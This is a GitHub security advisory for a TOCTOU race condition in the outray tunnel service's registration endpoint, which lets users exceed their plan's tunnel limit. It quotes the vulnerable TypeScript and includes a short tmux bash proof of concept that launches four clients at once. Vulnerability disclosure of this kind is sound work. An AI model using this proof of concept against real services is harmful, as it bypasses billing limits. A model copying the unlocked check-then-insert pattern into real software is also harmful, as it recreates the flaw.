# [M] Outray cli is vulnerable to race conditions in tunnels creation

## Summary
Severity: Medium
Advisory: GHSA-3pqc-836w-jgr7
CVE: CVE-2026-22820
CWE: CWE-367
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-01-13
Source: https://github.com/advisories/GHSA-3pqc-836w-jgr7
Type: github-advisory

## Affected
- npm: `outray` — affected >=0 <0.1.5

## Details
### Summary

A TOCTOU race condition vulnerability allows a user to exceed the set number of active tunnels in their subscription plan.

### Details

Affected conponent: `apps/web/src/routes/api/tunnel/register.ts`
- `/tunnel/register` endpoint code-:

```ts
// Check if tunnel already exists in database
          const [existingTunnel] = await db
            .select()
            .from(tunnels)
            .where(eq(tunnels.url, tunnelUrl));

          const isReconnection = !!existingTunnel;

          console.log(
            `[TUNNEL LIMIT CHECK] Org: ${organizationId}, Tunnel: ${tunnelId}`,
          );
          console.log(
            `[TUNNEL LIMIT CHECK] Is Reconnection: ${isReconnection}`,
          );
          console.log(
            `[TUNNEL LIMIT CHECK] Plan: ${currentPlan}, Limit: ${tunnelLimit}`,
          );

          // Check limits only for NEW tunnels (not reconnections)
          if (!isReconnection) {
            // Count active tunnels from Redis SET
            const activeCount = await redis.scard(setKey);
            console.log(
              `[TUNNEL LIMIT CHECK] Active count in Redis: ${activeCount}`,
            );

            // The current tunnel is NOT yet in the online_tunnels set (added after successful registration)
            // So we check if activeCount >= limit (not >)
            if (activeCount >= tunnelLimit) {
              console.log(
                `[TUNNEL LIMIT CHECK] REJECTED - ${activeCount} >= ${tunnelLimit}`,
              );
              return json(
                {
                  error: `Tunnel limit reached. The ${currentPlan} plan allows ${tunnelLimit} active tunnel${tunnelLimit > 1 ? "s" : ""}.`,
                },
                { status: 403 },
              );
            }
            console.log(
              `[TUNNEL LIMIT CHECK] ALLOWED - ${activeCount} < ${tunnelLimit}`,
            );
          } else {
            console.log(`[TUNNEL LIMIT CHECK] SKIPPED - Reconnection detected`);
          }

          if (existingTunnel) {
            // Tunnel with this URL already exists, update lastSeenAt
            await db
              .update(tunnels)
              .set({ lastSeenAt: new Date() })
              .where(eq(tunnels.id, existingTunnel.id));

            return json({
              success: true,
              tunnelId: existingTunnel.id,
            });
          }

          // Create new tunnel record
          const tunnelRecord = {
            id: randomUUID(),
            url: tunnelUrl,
            userId,
            organizationId,
            name: name || null,
            protocol,
            remotePort: remotePort || null,
            lastSeenAt: new Date(),
            createdAt: new Date(),
            updatedAt: new Date(),
          };

          await db.insert(tunnels).values(tunnelRecord);

          return json({ success: true, tunnelId: tunnelRecord.id });
        } catch (error) {
          console.error("Tunnel registration error:", error);
          return json({ error: "Internal server error" }, { status: 500 });
        }
```
- It checks if the tunnel exists in the database.
```ts
// Check if tunnel already exists in database
          const [existingTunnel] = await db
            .select()
            .from(tunnels)
            .where(eq(tunnels.url, tunnelUrl));

          const isReconnection = !!existingTunnel;
```

- Limit is checked here-:
```ts
// Check limits only for NEW tunnels (not reconnections)

if (!isReconnection) {

// Count active tunnels from Redis SET

const activeCount = await redis.scard(setKey);

console.log(

`[TUNNEL LIMIT CHECK] Active count in Redis: ${activeCount}`,

);
```
- Redis is checked for existing tunnel to check for reconnection.
```ts
// Check limits only for NEW tunnels (not reconnections)
          if (!isReconnection) {
            // Count active tunnels from Redis SET
            const activeCount = await redis.scard(setKey);
            console.log(
              `[TUNNEL LIMIT CHECK] Active count in Redis: ${activeCount}`,
            );
```

- If the tunnel limit is exceeded, it pops up the tunnel limit error.

```ts
if (activeCount >= tunnelLimit) {
              console.log(
                `[TUNNEL LIMIT CHECK] REJECTED - ${activeCount} >= ${tunnelLimit}`,
              );
              return json(
                {
                  error: `Tunnel limit reached. The ${currentPlan} plan allows ${tunnelLimit} active tunnel${tunnelLimit > 1 ? "s" : ""}.`,
                },
                { status: 403 },
              );
```
- If the limit is not exceeded, it triggers a the `Insert` Statement without locking transactions from other request

```ts
await db.insert(tunnels).values(tunnelRecord);
```
- If parallel requests are made by the `wshandler` in `/outray/outray-main/apps/tunnel/src/core/WSHandler.ts` from the command line app. A request can work on a non updated  row  because the `insert` row has not been triggered allowing the user to bypass the limit. It is much explained in the proof of concept. The key takeaway is db transactions should remain locked.

### PoC

Using this simple bash script, the `outray` binary will be run at the same time in one `tmux` window, demonstrating the race condition and opening 4 tunnels.

```bash
#!/usr/bin/env bash

# POC for Outray Tunnel Race condition
SESSION="outray-race"
PORTS=(8090 4000 5000 6000)

# Create new detached tmux session
tmux new-session -d -s "$SESSION" "echo '[*] outray race session started'; bash"

# Split the panes and run outray
for i in "${!PORTS[@]}"; do
  port="${PORTS[$i]}"

  if [ "$i" -ne 0 ]; then
    tmux split-window -t "$SESSION" -h
    tmux select-layout -t "$SESSION" tiled
  fi

  tmux send-keys -t "$SESSION" "echo '[*] Running outray on port $port'; outray $port" C-m
done

tmux set-window-option -t "$SESSION" synchronize-panes off

echo "[+] tmux session '$SESSION' created"
echo "[+] Attach with: tmux attach -t $SESSION"

```

Running this

```
seeker@instance-20260106-20011$ bash kay.sh
[+] tmux session 'outray-race' created
[+] Attach with: tmux attach -t outray-race

seeker@instance-20260106-20011$ tmux attach -t outray-race
```

<img width="1909" height="1021" alt="image" src="https://github.com/user-attachments/assets/c234cc94-fc25-4542-abdf-815332493a85" />


<img width="1907" height="936" alt="image" src="https://github.com/user-attachments/assets/1c302d7f-1ca6-46af-ab72-60fd01cdfded" />

### Impact

By exploiting this TOCTOU race condition in the affected component, the intended limit is bypassed and server resources is used with no extra billing charges on the user.

## References
- https://github.com/akinloluwami/outray/security/advisories/GHSA-3pqc-836w-jgr7
- https://github.com/outray-tunnel/outray/security/advisories/GHSA-3pqc-836w-jgr7
- https://nvd.nist.gov/vuln/detail/CVE-2026-22820
- https://github.com/outray-tunnel/outray/commit/08c61495761349e7fd2965229c3faa8d7b1c1581
- https://github.com/akinloluwami/outray
